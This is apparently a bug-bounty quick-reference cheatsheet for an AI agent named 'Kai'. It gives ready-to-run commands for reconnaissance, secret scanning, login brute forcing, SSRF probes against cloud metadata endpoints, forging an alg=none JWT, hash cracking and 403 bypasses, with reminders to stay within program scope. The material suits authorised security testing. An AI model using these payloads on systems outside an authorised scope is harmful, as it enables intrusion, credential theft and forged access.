# Bug Hunt Cheatsheet (Kai quick-ref)

Common commands per scenario. Copy-paste ready.

## Recon — full pipeline
```bash
bash ~/ai-agent/scripts/recon.sh <domain>
# output: ~/ai-agent/bughunt/targets/<domain>/recon-<ts>/SUMMARY.md
```

## Recon — manual fast
```bash
# subdomains (3 sources)
subfinder -d target.com -all -silent | sort -u > subs.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | tr ',' '\n' | sort -u >> subs.txt
echo target.com | gau --subs | awk -F/ '{print $3}' | sed 's/:.*//' | grep target.com >> subs.txt
sort -u subs.txt -o subs.txt

# resolve
dnsx -l subs.txt -silent > live-subs.txt

# probe (PD httpx, NOT python httpx)
/usr/local/bin/httpx -l live-subs.txt -silent -title -sc -tech-detect -follow-redirects -o httpx.txt
```

## Subdomain Takeover
```bash
subzy run --targets live-subs.txt --hide_fails --concurrency 50
nuclei -l live-subs.txt -tags takeover -severity medium,high
```

## OOB / Blind detection (interactsh)
```bash
# terminal 1: keep listening
interactsh-client -v -o /tmp/oob.log
# copy the .oast.fun domain shown

# terminal 2: inject in target
curl "https://target.com/api?url=https://abc123.oast.fun/probe"

# tail
tail -f /tmp/oob.log
```

## JS Secret Hunt
```bash
# extract JS files from live URLs
katana -u https://target.com -d 3 -jc -silent | grep '\.js' | sort -u > js-files.txt

# scan for secrets
mantra -ua "Mozilla/5.0" < js-files.txt

# alt: download then trufflehog
mkdir js && cd js && wget -i ../js-files.txt
trufflehog filesystem . --only-verified --json | jq -c .
```

## Git Repo Secret Scan
```bash
trufflehog git https://github.com/org/repo --only-verified
trufflehog github --org=target-org --only-verified --token=$GH_TOKEN
```

## Visual Triage (gowitness)
```bash
gowitness scan file -f httpx.txt --threads 5 --write-db
gowitness report serve --port 8080
# SSH tunnel: ssh -L 8080:localhost:8080 ubuntu@13.212.56.127
```

## ffuf Patterns
```bash
# directory
ffuf -u https://target.com/FUZZ -w ~/ai-agent/bughunt/wordlists/raft-medium-directories.txt -mc 200,204,301,302,307,401,403 -t 50

# subdomain VHOST
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w wordlist.txt -fs SIZE_OF_DEFAULT_RESPONSE

# parameter discovery
ffuf -u https://target.com/page?FUZZ=test -w params.txt -fs DEFAULT_SIZE

# auth brute
ffuf -u https://target.com/login -X POST -d 'user=admin&pass=FUZZ' -w rockyou.txt -fc 401
```

## Nuclei Targeted
```bash
# CVEs only, high+critical
nuclei -l urls.txt -severity high,critical -tags cve -rl 50

# specific tag combos
nuclei -l urls.txt -tags exposure,config,backup,debug
nuclei -l urls.txt -tags graphql,jwt,oauth
nuclei -l urls.txt -tags takeover

# DAST mode (intrusive, only if scope allows)
nuclei -l urls.txt -dast -tags xss,sqli,ssrf

# update templates
nuclei -update-templates
```

## SSRF Quick Probes (use interactsh domain)
```
https://OOB/                          # baseline
http://169.254.169.254/latest/meta-data/   # AWS IMDSv1
http://metadata.google.internal/           # GCP (need Metadata-Flavor: Google)
http://[::ffff:169.254.169.254]/          # IPv6 bypass
http://2852039166/                         # decimal AWS metadata
```

## JWT Quick Tests
```bash
# decode (no verify)
echojwt='eyJ...'; echo $echojwt | cut -d. -f1,2 | tr '_-' '/+' | base64 -d 2>/dev/null

# alg=none forge (python)
python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode(); p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode(); print(f'{h}.{p}.')"

# crack HS256
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

## GraphQL Quick Probe
```bash
# introspection
curl -X POST https://target.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}'

# fingerprint
graphw00f -t https://target.com/graphql -d
```

## Bugcrowd Submission Workflow
1. Confirm scope at program brief page (in-scope assets, OOS list)
2. Triage VRT class + CVSS — see references/10_reporting.md
3. Use template: ~/ai-agent/skills/redteam/report_templates/standard.md
4. Evidence: Bugcrowd attachment + Telegram (track msg_id) + Notion page
5. PoC reproducible: dig/curl/script triager can replay
6. Cite: PCI-DSS / OWASP / CWE / RFC where applicable

## Common VRT → Severity Quick Map
- RCE / Auth bypass full: P1
- Stored XSS auth context, SSRF cloud metadata, IDOR mass: P2
- Reflected XSS, IDOR single, Subdomain takeover, GraphQL IDOR: P3
- Open redirect, info disclosure (config), CSRF non-critical: P4
- Self-XSS, missing security header, info disclosure (banner): P5

## Tools — Path Traps to Avoid
- `httpx` SHOULD be `/usr/local/bin/httpx` (PD), NOT `~/.local/bin/httpx-py` (Python lib)
- `trufflehog` SHOULD be `/usr/local/bin/trufflehog` (v3+), NOT old python `truffleHog` (renamed to trufflehog-py)

## Disk Discipline
- Wordlists: ~/ai-agent/bughunt/wordlists/ (curated subset only, not full SecLists)
- Run output: per-target subfolder, prune old runs after evidence backed up
- Go cache: `go clean -cache -modcache` reclaim ~3GB if needed

## SPA Recon & Bundle Mining (lihat references/12_spa_recon.md)
- SPA catch-all: probe path balik 200 tapi size IDENTIK root = false positive, BUKAN exposed file. Verifikasi size != root.
- Nemu endpoint: mining JS bundle (grep API path/secret/host), bukan brute path.
- Runtime config: cek /config.json /env.js. recaptcha/GA/mixpanel = public by design (jangan overclaim). Internal IP/hostname = bobot.
- 403/401: tes bypass (XFF, X-Original-URL, path //, case, CORS evil origin) sebelum nyimpulin solid. GET-only di prod.
- Bugcrowd scope: /engagements/<slug>/changelog/<id>.json (suffix .json wajib) via playwright+chrome+cookie.
